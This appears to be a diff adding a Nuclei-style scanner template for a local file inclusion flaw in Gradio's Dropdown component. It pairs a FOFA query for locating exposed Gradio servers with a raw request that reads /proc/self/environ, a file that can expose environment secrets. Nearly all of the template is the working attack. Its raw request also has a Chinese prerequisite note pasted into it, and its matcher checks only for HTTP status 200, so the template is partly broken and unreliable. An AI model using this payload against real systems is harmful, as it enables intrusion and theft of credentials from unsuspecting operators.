@@ -1,0 +1,49 @@
+id: poc-wb8bk805mvvqx6xl
+info:
+  name: gradio Dropdown存在本地文件包含漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wb8bk805mvvqx6xl'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wb8bk805mvvqx6xl
+    fofa: title="gradio" || body="__gradio_mode__"
+http:
+- raw:
+  - '前提条件：
+
+    使用Gradio的 Dropdown组件
+
+
+    POST /run/predict HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Storage-Access: active
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    {"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
